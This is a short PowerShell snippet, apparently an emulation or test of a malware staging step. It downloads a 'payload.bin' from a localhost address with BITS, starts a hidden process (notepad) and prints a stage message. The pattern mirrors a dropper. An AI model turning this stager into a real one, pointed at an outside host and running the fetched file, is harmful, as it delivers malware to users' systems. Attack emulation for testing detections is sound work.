
<# Stage transfer #> try { $TargetUrl = "http://localhost:8081/update.dat"; $OutputPath = "$env:TEMP\payload.bin"; Start-BitsTransfer -Source $TargetUrl -Destination $OutputPath; Start-Process -FilePath "notepad.exe" -WindowStyle Hidden; Write-Output "stage 42 initialized"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
